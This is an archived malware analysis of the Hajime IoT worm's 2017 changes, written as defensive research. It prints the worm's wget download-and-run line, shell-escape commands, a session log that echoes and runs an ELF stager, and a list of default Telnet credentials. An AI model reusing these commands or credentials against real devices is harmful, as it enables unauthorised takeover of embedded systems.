{
    "id": "dcff4452-bcc1-4d04-b0bd-923ef007faa5",
    "created_at": "2023-01-12T15:08:57.546189Z",
    "updated_at": "2025-03-27T02:05:30.266183Z",
    "deleted_at": null,
    "sha1_hash": "114d9c66ce9905848c5d94534f0ea3b19fa62918",
    "title": "2017-04-15 - Hajime - A Decentralized Modular Worm - Followup",
    "authors": "",
    "file_creation_date": "2022-05-28T17:46:28Z",
    "file_modification_date": "2022-05-28T17:46:28Z",
    "file_size": 79681,
    "plain_text": "# Hajime: A follow-up\n\n**x86.re/blog/hajime-a-follow-up/**\n\nApril 15, 2017\n\nHajime is a decentralized modular worm that targets embedded devices with Telnet exposed\nto the internet.\n\nIts binaries are built for Linux devices with ARMv5, ARMv6, ARMv7, MIPS little-endian and\nMIPS big-endian processor architectures.\n\nIt was originally discovered by Sam Edwards and I of Rapidity Networks SRG, and its\n[behaviour was outlined in a paper that can be found here.](https://security.rapiditynetworks.com/publications/2016-10-16/hajime.pdf)\n\nEver since the release of the aforementioned paper on October 16th of 2016, there has been\na series of changes as to how Hajime operates.\n\nThe atk module now checks for the presence of wget and uses it in place of its own\nstager if available. It checks whether wget exists by running the following command:\n```\nnc; wget; /bin/busybox UXVMW\n\n```\nAnd checking its output for the strings “wget: applet not found” or “wget: not found”.\n\nThe request URI is always /.i:\n```\nrm .s; wget http://x.x.x.x:10363/.i; chmod +x .i; ./.i; exit\n\n```\nSimilarly, the atk module (formerly named exp) now also features a minimal HTTP web\nserver for spreading stage2s, listening on an unprivileged random port (>= 1024). It\nserves the stage2 corresponding to the architecture of the device that it is infecting\nregardless of the request URI, as long as the request method is GET. The response is\nas follows:\n```\nHTTP/1.0 200 OK\nContent-Type: application/octet-stream\nContent-Length: *size of stage2*\n*payload*\n\n```\nThe atk module now attempts to port-forward the ports it uses to spread through the\nuse of UPnP’s AddPortMapping SOAP command.\nComplete overhaul of the scanning/attack logic.\nThe atk module now selects a random 5-letter uppercase alphabetic string as the\nBusyBox applet name for its command output delimiter (formerly “ECCHI”).\n\n\n-----\n\nThe atk module is now capable of infecting ARRIS modems by using the password-ofthe-day “backdoor” with the default seed (outlined here:\n[https://w00tsec.blogspot.com/2015/11/arris-cable-modem-has-backdoor-in.html). It](https://w00tsec.blogspot.com/2015/11/arris-cable-modem-has-backdoor-in.html)\ndoes so by checking for the Arris telnet banner upon connection.\nUpon successful login, Hajime now tries a variety of shell escape vulnerabilities to\nattempt to drop out of any potential restricted shells. On non-Arris devices, the\nattempted commands are (in respective order):\n```\nenable\nshell\nsh\n\n```\nOn Arris devices, the attempted commands are (in respective order):\n```\nsystem\nping ; sh\n\n```\nThe latter has also been observed to be in use by LuaBot (see here:\n[https://w00tsec.blogspot.com/2016/09/luabot-malware-targeting-cable-modems.html)](https://w00tsec.blogspot.com/2016/09/luabot-malware-targeting-cable-modems.html)\n\nThe atk module now has a significantly larger table of credentials (formerly 12\ncombinations, now 63):\n\n**Username** **Password**\n\nroot xc3511\n\nroot vizxv\n\nroot admin\n\nadmin admin\n\nroot 888888\n\nroot xmhdipc\n\nroot default\n\nroot juantech\n\nroot 123456\n\nroot 54321\n\nsupport support\n\nroot\n\nadmin password\n\n\n-----\n\n**Username** **Password**\n\nroot root\n\nroot 12345\n\nuser user\n\nadmin\n\nroot pass\n\nadmin admin1234\n\nroot 1111\n\nadmin smcadmin\n\nadmin 1111\n\nroot 666666\n\nroot password\n\nroot 1234\n\nroot klv123\n\nAdministrator admin\n\nservice service\n\nsupervisor supervisor\n\nguest guest\n\nguest 12345\n\nadmin1 password\n\nadministrator 1234\n\n666666 666666\n\n888888 888888\n\nubnt ubnt\n\nroot klv1234\n\nroot Zte521\n\nroot hi3518\n\n\n-----\n\n**Username** **Password**\n\nroot jvbzd\n\nroot anko\n\nroot zlxx.\n\nroot 7ujMko0vizxv\n\nroot 7ujMko0admin\n\nroot system\n\nroot ikwb\n\nroot dreambox\n\nroot user\n\nroot realtek\n\nroot 00000000\n\nadmin 1111111\n\nadmin 1234\n\nadmin 12345\n\nadmin 54321\n\nadmin 123456\n\nadmin 7ujMko0admin\n\nadmin 1234\n\nadmin pass\n\nadmin meinsm\n\ntech tech\n\nmother fucker\n\nroot 5up\n\nAdmin 5up\n\nUpon its startup, the stage2 now attempts to block a series of ports on the infected\ndevice through the use of iptables:\n\n\n-----\n\n```\niptables A INPUT p tcp destination port 23 j DROP\niptables -A INPUT -p tcp --destination-port 7547 -j DROP\niptables -A INPUT -p tcp --destination-port 5555 -j DROP\niptables -A INPUT -p tcp --destination-port 5358 -j DROP\n\n```\nIt also attempts to drop an INPUT chain named “CWMP_CR”:\n```\niptables -D INPUT -j CWMP_CR\niptables -X CWMP_CR\n\n```\nThe public/private keys as well as the RC4 key derived by the key exchange are no\nlonger static, as the misuse of C’s rand function has since been fixed by the author.\nConfig files can now contain a new section, [info], containing messages from the\nauthor. The string under that section is printed to the standard output, and appears to\nbe aimed at researchers that are debugging Hajime.\nThe info section of the current config as of April 13 2017 is as follows (stripped of ANSI\nescape codes):\n```\nJust a white hat, securing some systems.\nImportant messages will be signed like this!\nHajime Author.\nContact CLOSED\nStay sharp!\n\n```\nExample Hajime attack session (Arris banner, ARMv7 platform, no wget available):\n\n\n-----\n\n```\n1G3IL4R495\nsystem\nping ; sh\ncat /proc/mounts; /bin/busybox PSLQP\ncd /var; (cat .s || cp /bin/echo .s); /bin/busybox PSLQP\nnc; wget; /bin/busybox PSLQP\n(dd bs=52 count=1 if=.s || cat .s)\n/bin/busybox PSLQP\n>.s; cp .s .i\necho -ne\n\"\\x7f\\x45\\x4c\\x46\\x01\\x01\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x28\\x00\\x01\\\n >> .s\necho -ne\n\"\\x00\\x00\\x01\\x00\\xf8\\x00\\x00\\x00\\xf8\\x00\\x00\\x00\\x05\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x02\\\n >> .s\necho -ne\n\"\\x07\\x00\\x2d\\xe9\\x03\\x00\\xa0\\xe3\\x0d\\x10\\xa0\\xe1\\x66\\x00\\x90\\xef\\x14\\xd0\\x8d\\xe2\\x4f\\\n >> .s\necho -ne\n\"\\x00\\x50\\x85\\xe0\\x00\\x00\\x50\\xe3\\x04\\x00\\x00\\xda\\x00\\x20\\xa0\\xe1\\x01\\x00\\xa0\\xe3\\x04\\\n >> .s\necho -ne\n\"\\x62\\x69\\x00\\x01\\x1c\\x00\\x00\\x00\\x05\\x43\\x6f\\x72\\x74\\x65\\x78\\x2d\\x41\\x35\\x00\\x06\\x0a\\\n >> .s\necho -ne\n\"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\\n >> .s\necho -ne\n\"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x11\\x00\\x00\\x00\\x03\\\n >> .s\necho -ne\n\"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x1f\\x01\\x00\\x00\\x21\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\\n >> .s\n./.s>.i; chmod +x .i; ./.i; rm .s; exit\n\n```\nExample Hajime attack session (Arris banner, ARMv7 platform, wget available):\n```\n1G3IL4R495\nsystem\nping ; sh\ncat /proc/mounts; /bin/busybox UXVMW\ncd /var; (cat .s || cp /bin/echo .s); /bin/busybox UXVMW\nnc; wget; /bin/busybox UXVMW\n(dd bs=52 count=1 if=.s || cat .s)\n/bin/busybox UXVMW\nrm .s; wget http://x.x.x.x:10363/.i; chmod +x .i; ./.i; exit\n\n```\nNote that the first line on both sessions is the Arris password-of-the-day for April 13th, 2017.\n\nThe above research was conducted through the analysis of the following Hajime\nsamples:\n\n\n-----\n\n```\nFile name: .i.arm7.1485239580\nHashes:\nMD5: 2e9dd2e43e866a26c44ceccc129e0c52\nSHA1: c2b82c322cfd0f61d234267a99bb848898fe54ea\nSHA256:  e3a4120c1f2ec3d430ad95f567179280d657739dd906053d0e9b6d45d59ffa93\nSHA512: \n74e160a752517fcc28c49efbb326689197d2b2f7bd7c365aaaed511c2e9565c90509b61520b9a117bafae2\nFile name: atk.arm7.1485239515\nHashes:\nMD5: 359779e208d59d84a9b58a278be5345b\nSHA1: 14ac6ea9736ae013071995dff535c34ebb411143\nSHA256:  c02cb27fee760a29d990cecfb029b64aa2abbc349fa2a9c17b2438add3af4da0\nSHA512: \n9e4e8be435613f08380d057e4d0cf0532308c69e82fe9fe9c951d47b65ac4166db83cafe043617d474fb07\n\n```\nA repository containing the filenames and hashes of all known Hajime configurations and\n[binaries can be found at https://github.com/Psychotropos/hajime_hashes.](https://github.com/Psychotropos/hajime_hashes)\n\nSamples are also automatically submitted to VirusTotal for analysis:\n[https://www.virustotal.com/en/user/psychotropos/](https://www.virustotal.com/en/user/psychotropos/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2017/2017-04-15 - Hajime - A Decentralized Modular Worm - Followup.pdf"
    ],
    "report_names": [
        "2017-04-15 - Hajime - A Decentralized Modular Worm - Followup.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536137,
    "ts_updated_at": 1743041130,
    "ts_creation_date": 1653759988,
    "ts_modification_date": 1653759988,
    "files": {
        "pdf": "https://archive.orkl.eu/114d9c66ce9905848c5d94534f0ea3b19fa62918.pdf",
        "text": "https://archive.orkl.eu/114d9c66ce9905848c5d94534f0ea3b19fa62918.txt",
        "img": "https://archive.orkl.eu/114d9c66ce9905848c5d94534f0ea3b19fa62918.jpg"
    }
}